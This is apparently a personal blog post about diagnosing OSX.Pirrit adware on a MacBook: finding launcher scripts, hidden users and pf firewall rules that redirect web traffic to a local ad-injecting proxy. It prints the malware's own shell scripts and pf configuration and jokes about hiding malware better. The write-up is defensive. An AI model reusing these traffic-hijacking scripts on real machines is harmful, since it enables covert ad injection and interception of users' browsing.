+++
slug = "a-nasty-mac-virus"
date = "2016-07-09T15:36:52+02:00"
description = ""
draft = false
tags = []
title = "A Nasty Mac Virus, or How I Learned To Love the App Store"
topics = []

+++

Some time ago my little sister complained that her MacBook was getting slow,
and had frequent freezes, to the point it was barely usable any more.

She also was seeing many ads when browsing, even though she had an ad blocker
instead.

So I lend her my own laptop while I kept hers to investigate.

Here's what happened next ...

<!--more-->

# Mysterious processes

In order to investigate the freezes, I start `htop`[^1] to have a look
at the processes that are running.

I see a bunch of scripts running (as root), and some other
processes running with weird user names:

```text
root          /bin/sh  /etc/branchiosaurian.sh
instroke      /Library/branchiosaurian/Contents/MacOS/branchiosaurian
```

Googling "branchiosaurian virus MacOS" or "instroke user name" leads to nowhere.

# Strange scripts

The process are running from a strange location: it's rare to see `*.sh` scripts
in `/etc`, usually `/etc` is only used for configuration files.

So I decide to see how many there are in `/etc`:


```text
$ ls /etc/*.sh
/etc/Dicyemida.sh*
/etc/Fulah.sh*
/etc/Gothism.sh*
/etc/audile.sh*
/etc/axogamy.sh*
/etc/bacteriohemolysin.sh*
/etc/branchiosaurian.sh*
/etc/duello.sh*
/etc/entry.sh*
/etc/gallflowerUpd.sh*
/etc/hemodystrophy.sh*
/etc/lichenlike.sh*
/etc/overreach.sh*
/etc/retinene.sh*
/etc/run_upd.sh*
/etc/sidereally.sh*
/etc/tealess.sh*
/etc/thiocyanide.sh*
/etc/unwittingly.sh
```

All the scripts look the same, only the weird names
for the process and the user are different:

```bash
if [ -a /Library/branchiosaurian/Contents/MacOS/branchiosaurian ];
then
  sleep 10
  sudo pfctl -evf /etc/branchiosaurian.conf
  sudo -u Benjy /Library/branchiosaurian/Contents/MacOS/branchiosaurian
fi
exit 0
```

Each of them has a matching folder in `/Library/<name>`

`/Library/<name>/Contents/MacOS/<name>` is a Mach-O C++ executable, with
dependencies on Qt4 frameworks stuff (`Qt4Core`, `QtGui` and `QtNetwork`)
in `Contents/Frameworks`, like any `Qt` application.

(Except they are in `/Library` and not `/Applications` ...)


There's also a script in `Contents/MacOS/rec_script.sh` which contains:

```bash
# set redirections
HIDDEN_USER=$(sudo defaults read /Library/Preferences/com.common.plist user_id)
echo $HIDDEN_USER

activeInterface=$(route get default | sed -n -e 's/^.*interface: //p')
if [ -n "$activeInterface" ]; then
    pfData="rdr pass inet proto tcp from $activeInterface to any port 80 -> 127.0.0.1 port 9882\n\
    pass out on $activeInterface route-to lo0  inet proto tcp from $activeInterface to any port 80 keep state\n\
    pass out proto tcp all user "$HIDDEN_USER"\n"
    echo "$pfData" > /etc/pf_proxy.conf
else
    echo "Unable to find active interface"
    exit 1
fi

exit 0
```

And a configuration file in `/etc`

```text
$ cat /etc/branchiosaurian.conf
rdr pass inet proto tcp from en1 to any port 80 -> 127.0.0.1 port 9882
pass out on en1 route-to lo0  inet proto tcp from en1 to any port 80 keep state
pass out proto tcp all user indianaite
```


Finally, a `ps aux` shows a `pfctl` processes running like this:

```text
pfctl -evf /et/<name>.conf
```


So there are a bunch of processes doing something with the network, re-rooting
traffic going through the `80` port to somewhere else. This can't be good ...


# First clue

Confused, I run the only thing I can think of:

```text
$ strings /Library/branchiosaurian/Contents/MacOS/branchiosaurian
...
AdsProxyEngine
userDisabledProxy()
...
```

Ahah! Googling `virus mac AdsProxyEngine` leads to reddit thread:
*[Ever heard of the process uncontainable?](
https://www.reddit.com/r/apple/comments/4g4pup/ever_heard_of_the_process_uncontainable/)*

There's a confused Mac user who is seeing processes with weird names too:
(Here, a `uncontainable` process is running as the `razoredge` user)

# Following the links

Reading the thread leads to the following pages, which explain everything:

* [Analysis of an Intrusive Cross-Platform Adware: OSX/Pirrit](
https://objective-see.com/blog/blog_0x0E.html)

* [Cybereason Labs Analysis: The Minds Behind the OSX.Pirrit Malicious Adware](
  http://www.cybereason.com/cybereason-labs-analysis-the-minds-behind-the-osx-pirrit/)

Here's a quick summary:

1. The virus is known as "OSX.Pirrit": it started as a Windows
   program, and then ported to Mac.

2. The virus installs a program well hidden which intercepts traffic to external
   websites in order to insert ads. That's what causes the freezes, and the fact
   that AdBlock does not seem to work. It's called an "adware" (a portmanteau
   word from "ads" and "software")

3. Fortunately for us, one of the programmers made the mistake of packaging the
   software on its own machine using `tar`, which records the user name and the
   date. That's how the researchers from Cybereason were able to find woh's
   behind the adware: a guy working for TargetingEdge, a "online marketing"
   company.

4. Quoting the article from Cybereason:

> The adware's creators removed the original installers for MPlayerX, NicePlayer
> and VLC, legitimate media players that people can easily download, and replaced
> them with an installer that has OSX.Pirrit as well as the media player.


I knew that my sister had installed MPlayerX, so I looked around, and even
found a thread where someone says that the MPlayerX author himself was offering
the adware bundled with the installer on his web site.
(It's a rumour, no way for me to check if this is true ...)

# Lessons learned

* You can create hidden users on mac (it only takes a few tricks with the
  preferences of the login window)

* You can use `dscl` to display user names (`/etc/passwd` won't help):

```text
$ dscl . -list /Users UniqueID
```

  By the way, that's how you can check whether you are infected with this virus
  or not: the names change, but the user numeric ID is hard-coded and is always
  401 ...

* Using random names from `/usr/share/dict/words` to name things make it really
  hard to find clues using a search engine. (And this file is guaranteed to
  exist on any Mac version!)

* If you create a malware, take the time to strip the executable and obfuscate
  the source code&nbsp;;)

* Also, don't package it on your own machine with your regular account!

* Even if MPlayerX is free, you can buy it from the Apple Store for less than
  2 euros, and it's much safer: you know that Apple has audited the software,
  it's signed, so you know where it comes from, and you don't even have to open
  a web browser and risk downloading stuff from the wrong place.
  (Note that you still have to trust Apple ...)

* If you can't accept the fact that you're gonna have to pay even if you use
  free or open-source stuff on Mac, well, switch to Linux :) There's a great
  article explaining why this kind of nasty stuff can't happen if you use the
  packages provided by your distribution: *[Why Maintainers Matter](
  http://kmkeen.com/maintainers-matter/)*

# Next steps

First, I'm going to reformat and re-install the operating system using
[DiskMaker X](http://diskmakerx.com/), but I don't really know what to tell my
sister so this does not happen again.

Don't tell me to install an antivirus, I know [it won't work](
http://www.ranum.com/security/computer_security/editorials/dumb/)

People tell me there's a GUI from `homebrew`, I'll try that, but if you have
some ideas, (besides only using the Apple Store for now), I'd love to
[hear from you]({{< ref "pages/feedback.md" >}})

There's also the option of only allowing apps from the AppStore
(not even those which are signed with a developer key)


[^1]: Yup, `htop` works really well on Mac too since the 2.0 version. You can learn more about this here: *[How htop Was Made Portable](https://www.youtube.com/watch?v=g5GamptmWeA)*
